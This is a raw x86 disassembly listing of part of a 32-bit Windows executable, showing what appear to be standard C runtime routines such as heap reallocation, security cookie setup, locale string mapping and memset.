  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
